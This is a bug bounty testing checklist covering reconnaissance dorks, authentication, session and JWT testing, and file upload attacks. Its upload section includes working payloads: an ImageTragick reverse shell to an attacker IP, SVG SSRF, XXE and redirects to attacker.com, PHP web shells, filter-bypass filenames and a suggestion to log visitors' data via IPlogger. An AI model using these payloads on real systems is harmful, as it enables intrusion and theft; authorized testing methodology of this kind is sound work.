# Bug Bounty Checklist

#### **Information Gathering:**

\
[LeakIX](https://leakix.net/) - often blocked by organizations for gray hat searches\
[Shodan](https://www.shodan.io/) - scans less frequently than LeakIX but whitelisted\
[Censys](https://search.censys.io/) - best overall scanner but without vulnerability discovery

[PrettyRecon](https://prettyrecon.com/) - Active Reconnaissance Tool\
\
Daily updated Text file of all domains within scope on active Bug Bounty Programs \
[https://github.com/arkadiyt/bounty-targets-data/blob/main/data/domains.txt](https://github.com/arkadiyt/bounty-targets-data/blob/main/data/domains.txt)

| Google Dork                 | Purpose                       |
| --------------------------- | ----------------------------- |
| `intitle:"index of /.git/"` | Searching for Git Directories |
| `inurl:"index.php?id="`     | Searching for PHP pages       |

| Shodan Dork                             | Purpose                             |
| --------------------------------------- | ----------------------------------- |
| `hostname:".gov" product:"Jenkins" 200` | Searching Jenkins instances in .gov |
|                                         |                                     |
|                                         |                                     |



Sensitive Information Exposure methods\
\
Use [GitTools](https://github.com/internetwache/GitTools) gitdumper.sh

* [ ] `gitdumper.sh http://IPorURL/.git git`



#### **Authentication:**

Registration

* Input validation
  * [ ] &#x20;Space manipulation & Using Dots & Case sensivity check
  * [ ] &#x20;Checking allowed characters (`<> " '`)
  * [ ] &#x20;Register using `myemail%00@email.com` or (%0d, %0a)
  * [ ] &#x20;Register using `myemail@target.com`
    * Response manipulate from `401 Unauthorized` to `200 Ok` or `302 Found`
* Analysis
  * [ ] &#x20;Check `.js` file on the page, such as `login.js`
  * [ ] &#x20;Check the parameters used on the endpoint
    * Might be listed in the `source` or `js`
  * [ ] &#x20;Checking the Mobile Endpoint
    * Does it have the same protection as webapp?
    * How does it treat Unicode characters?
  * [ ] &#x20;Google Dorks
    * `site:example.com inurl:register inurl:&`
    * `site:example.com inurl:signup inurl:&`
    * `site:example.com inurl:join inurl:&`
* Misc
  * [ ] &#x20;Email Takeover
    * Register an Email, before confirming, change the email. check if the new confirmation email is sent to the first registered email.

<!---->

* [ ] &#x20;Password reset process
  * Password reset tokens (expiration/reuse)
* [ ] &#x20;Failed retry lockout (DoS)
* [ ] &#x20;Password policies
* [ ] &#x20;Update profile information without asking password
* [ ] &#x20;Default or easy to guess keys
* [ ] &#x20;User enumeration
* [ ] &#x20;HTTP Authentication
* [ ] &#x20;Authentication Bypass
* [ ] &#x20;Identify weak authentication channels (Find primary mechanism and identify secondary mechanicsm / methods \[Mobile App, Call Center, SSO])

#### **Authorization:**

* [ ] &#x20;Testing Directory traversal/file inclusion
* [ ] &#x20;Access to features, functionality or data that should not be available for the current role (privilege escalation, horizontal & vertical, Example: Access admin functionality from a user account without privileges (create, delete, modify users...)
*   [ ] &#x20;IDORs

    Example: The following URL returns our profile: target.com/profile?idUser=123 Cambiar por target.com/profile?idUser=12**4** Do you have access? Should this profile be accessible to our current user?

#### **Session:**

* [ ] &#x20;No cookie validation
* [ ] &#x20;Not setting a new cookie (session fixation - logout -> Login again)
* [ ] &#x20;Cookieis easy to reverse engineer (base64/Hash ID)
*   [ ] &#x20;Are security options set? (secure/HttpOnly)

    HttpOnly not set? is there an XSS? \<script>alert(document.cookie)\</script>
*   [ ] &#x20;Testing for **C**ross **S**ite **R**equest **F**orgery

    Delete token (parameter y header) Forge your own token Use a second identical CSRF parameter Change POST to GET (or reverse, put, etc)

    Features that should be tested: . Add / Upload file · Change Email · Delete files · Change Password · Transfer money · Edit profile
*   [ ] &#x20;Logout

    Are you actually logged out? (Session is destroyed)
*   [ ] &#x20;Session timeout

    Does the session expire after a reasonable amount of time?
*   [ ] &#x20;JWT

    Signature check Check claims (Especially: **aud** -> "In practical use, this tends to be the "client id" or "client key" of the application that the JWT is intended to be used by."") Signature algorithm Sensitive information in the token How is it revoked? How is it used? How is it processed?

    *   [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

        Brute force, example: ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
    *   [jwt\_tool](https://github.com/ticarpi/jwt\_tool)

        Check various vulns, crack with dictionary Example: python3 jwt\_tool.py
    * [JWT2John](https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py)

    Convert JWT to a format crackable by John python3 [jwt2john.py](http://jwt2john.py/)

    Execute John: ./john /tmp/token.txt —wordlist=wordlist.txt

#### **General:**

* [ ] &#x20;Test HTTP Methods
*   [ ] &#x20;Header Injections

    X-Forwarded-Host: xxxx.com X-Forwarded-For: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Originating-IP: 127.0.0.1
* [ ] &#x20;Test CORS
*   [ ] &#x20;S3 AWS

    * [lazys3](https://github.com/nahamsec/lazys3)
    * [AWS Cli](https://aws.amazon.com/es/cli/)

    [http://bucket.s3.amazonaws.com](http://bucket.s3.amazonaws.com/) / [http://s3.amazonaws.com/bucket](http://s3.amazonaws.com/bucket) aws s3 cp test.txt s3://target --no-sign-request aws s3 ls s3://target --no-sign-request

    * [Metadata Cloud](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b)
    * [How the AWS Access Key & Secret works](https://github.com/streaak/keyhacks#AWS-Access-Key-ID-and-Secret)****

    ****

#### **File Upload:**

* Extensions Impact
  * `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
  * `SVG`: Stored XSS, SSRF, XXE
  * `GIF`: Stored XSS, SSRF
  * `CSV`: CSV injection
  * `XML`: XXE
  * `AVI`: LFI, SSRF
  * `HTML`, `JS` : HTML injection, XSS, Open redirect
  * `PNG`, `JPEG`: Pixel flood attack (DoS)
  * `ZIP`: RCE via LFI, DoS
  * `PDF`, `PPTX`: SSRF, BLIND XXE
* Blacklisting Bypass
  * PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
  * ASP → `asp`, `.aspx`, `.cer`, `.asa`
  * Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
  * Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
  * Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
* Whitelisting Bypass
  * `file.jpg.php`
  * `file.php.jpg`
  * `file.php.blah123jpg`
  * `file.php%00.jpg`
  * `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
  * `file.php%00`
  * `file.php%20`
  * `file.php%0d%0a.jpg`
  * `file.php.....`
  * `file.php/`
  * `file.php.\`
  * `file.php#.png`
  * `file.`
  * `.html`
* Vulnerabilities
  * [ ] Directory Traversal
    * Set filename `../../etc/passwd/logo.png`
    * Set filename `../../../logo.png` as it might changed the website logo.
  * [ ] SQL Injection
    * Set filename `'sleep(10).jpg`.
    * Set filename `sleep(10)-- -.jpg`.
  * [ ] Command Injection
    * Set filename `; sleep 10;`
  *   [ ] SSRF

      * Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
      * SSRF Through `.svg` file.

      ```php
      <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
      ```
  *   [ ] ImageTragic

      ```
      push graphic-context
      viewbox 0 0 640 480
      fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
      pop graphic-context
      ```
  *   [ ] XXE

      * Upload using `.svg` file

      ```xml
      <?xml version="1.0" standalone="yes"?>
      <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
      <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
         <text font-size="40" x="0" y="16">&xxe;</text>
      </svg>
      ```

      ```xml
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
          <image xlink:href="expect://ls"></image>
      </svg>
      ```

      * Using excel file
  *   [ ] XSS

      * Set file name `filename="svg onload=alert(document.domain)>"` , `filename="58832_300x300.jpg<svg onload=confirm()>"`
      * Upload using `.gif` file

      ```
      GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
      ```

      * Upload using `.svg` file

      ```xml
      <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
      ```

      ```xml
      <?xml version="1.0" standalone="no"?>
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

      <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
         <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
         <script type="text/javascript">
            alert("HolyBugx XSS");
         </script>
      </svg>
      ```
  *   [ ] Open Redirect

      1. Upload using `.svg` file

      ```xml
      <code>
      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
      <svg
      onload="window.location='https://attacker.com'"
      xmlns="http://www.w3.org/2000/svg">
      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
      </svg>
      </code>
      ```
* Content-ish Bypass
  * [ ] Content-type validation
    * Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
  *   [ ] Content-Length validation

      * Small PHP Shell

      ```php
      (<?=`$_GET[x]`?>)
      ```
  *   [ ] Content Bypass Shell

      * If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )

      ```php
      GIF89a; <?php system($_GET['cmd']); ?>
      ```
* Misc
  * [ ] Uploading `file.js` & `file.config` (web.config)
  * [ ] Pixel flood attack using image
  * [ ] DoS with a large values name: `1234...99.png`
  * [ ] Zip Slip
    * If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
  *   [ ] Image Shell

      * Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

      ```php
      exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
      ```

#### **Adobe Experience Manager (AEM) Configuration Testing**  Shodan Dork:

`http.component:"Adobe Experience Manager"`

Resources\
[AEM Hacker Tool](https://github.com/0ang3el/aem-hacker)\
[SlideShare presentation on AEM by 0ang3el](https://www.slideshare.net/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs)
